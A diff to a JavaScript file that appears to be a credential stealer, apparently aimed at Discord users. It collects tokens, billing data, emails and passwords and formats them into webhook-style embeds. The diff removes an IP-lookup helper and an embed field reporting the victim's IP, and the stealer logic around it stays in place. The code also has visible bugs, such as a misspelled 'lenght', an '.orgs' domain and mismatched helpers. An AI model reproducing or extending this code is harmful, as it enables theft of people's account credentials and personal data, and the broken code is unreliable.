@@ -490,24 +490,6 @@ const fetchBilling = async (token) => {
   if (!bill.lenght || bill.length === 0) return '';
   return JSON.parse(bill);
 };
-const fetchIp = async (token) => {
-  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
-    xmlHttp.open("GET", "https://api.ipify.orgs", false); 
-    xmlHttp.send(null); 
-    xmlHttp.responseText`);
-  return JSON.parse(bill);
-};
-
-const getIp = async (token) => {
-  const data = await fetchBilling(token);
-  let ip = "";
-  data.forEach((x) => {
-    if (!x.invalid) {
-      ip += x.ip
-    }
-  });
-  return ip;
-};
 
 const getBilling = async (token) => {
   const data = await fetchBilling(token);
@@ -691,11 +673,6 @@ const login = async (email, password, token) => {
           {
             name: '<:944007233820307467:959785232037470208> Email:',
             value: `\`${email}\``,
-            inline: true,
-          },
-          {
-            name: '<:944007233820307467:959785232037470208> Email:',
-            value: `\`${ip}\``,
             inline: true,
           },
           {
